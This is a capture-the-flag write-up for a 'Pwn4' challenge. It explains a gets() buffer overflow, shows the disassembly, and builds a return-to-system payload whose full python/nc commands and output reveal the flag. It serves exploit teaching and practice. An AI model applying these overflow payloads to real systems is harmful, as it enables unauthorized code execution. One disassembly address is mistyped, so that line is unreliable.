# Pwn4 write-up

![](/assets/pwn4.png)

## Analysis

The binary reads an input into a **fixed size buffer** of size 12 bytes. This is done in the function `func1`

```nasm
.text:080484FD func1           proc near               ; CODE XREF: main+35p
.text:080484FD
.text:080484FD s               = byte ptr -0Ch
.text:080484FD
.text:080484FD                 push    ebp
.text:080484FE                 mov     ebp, esp
.text:08048500                 sub     esp, 18h
.text:08048503                 sub     esp, 0Ch
.text:08048506                 lea     eax, [ebp+s]
.text:408048509                 push    eax             ; s
.text:0804850A                 call    _gets
.text:0804850F                 add     esp, 10h
.text:08048512                 nop
.text:08048513                 leave
.text:08048514                 retn
.text:08048514 func1           endp
```

The stack layout looks like

```
-0000000C str             db 12 dup(?)
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
```

The return address can be overwritten by overflowing the buffer. This gives control over `EIP`.

The binary contains a decoy function `flag_func` that seems to print the flag.

```nasm
.text:080484CB                 public flag_func
.text:080484CB flag_func       proc near
.text:080484CB                 push    ebp
.text:080484CC                 mov     ebp, esp
.text:080484CE                 sub     esp, 8
.text:080484D1                 sub     esp, 0Ch
.text:080484D4                 push    offset command  ; "/bin/cat flag2.txt"
.text:080484D9                 call    _system
.text:080484DE                 add     esp, 10h
.text:080484E1                 nop
.text:080484E2                 leave
.text:080484E3                 retn
.text:080484E3 flag_func       endp
```

We can redirect execution to `flag_func` by crafting the input as follows:

* 12 bytes for filling the buffer
* 4 bytes for overwriting the saved value of `ebp` on the stack
* `\xCB\x84\x04\x08` \(the address of `flag_func` in little endian byte order\)

Testing with these values:

```bash
$ python -c "print 'A'*16+ '\xCB\x84\x04\x08'" > exploit  
$ nc web.ctf.tamu.edu 4324 < exploit 
I require an input: 
Did you really think it would be that easy?
```

We do not get the flag.

Searching for strings we get one which is not used anywhere.

```nasm
.data:0804A028                 public flag
.data:0804A028 flag            db '/bin/cat flag.txt',0
.data:0804A028 _data           ends
```

This suggests the flag must be in the file _flag.txt_ and not _flag2.txt_. Thus somehow we need to pass this string as argument to `system`  which is located at `08048390`.

```nasm
.plt:08048390 ; int system(const char *command)
.plt:08048390 _system         proc near               ; CODE XREF: flag_func+Ep
.plt:08048390                 jmp     ds:off_804A014
.plt:08048390 _system         endp
```

The return address from `func1` must be overwritten with this address. `system` takes a `char *` as an argument. This value must also be provided in the stack as well. Thus the stack must look like this:

```
<12 bytes buffer>
<overwritten ebp>
<return address from func1> ; address of system
<dummy return address>
<argument to system>
```

The `call` instruction transfers the execution to the target address. Before execution begins, the return address is pushed on the stack at the top. Hence the reason to provide a dummy return address to simulate the stack frame of `system`. 

The exploit code looks like:

```
'A'*16 + '\x90\x83\x04\x08' + 'BBBB' + '\x28\xa0\x04\x08'
```

`'A' * 16` -&gt; Fill buffer and overwrite `ebp`.  
`'\x90\x83\x04\x08'` -&gt; return address from `func1` \(`system`\)  
`'BBBB'` -&gt; Dummy return address from `system`.  
`'\x28\xa0\x04\x08'` -&gt; Address of string \(argument to `system`\)

## Exploitation

```bash
$ python -c "print 'A'*16 + '\x90\x83\x04\x08' + 'BBBB' + '\x28\xa0\x04\x08'" > exploit
 
$ nc web.ctf.tamu.edu 4324 < exploit 
I require an input:
gigem{R3TURN_0R13NT3D_PR0F1T}
```

**gigem{R3TURN\_0R13NT3D\_PR0F1T}**

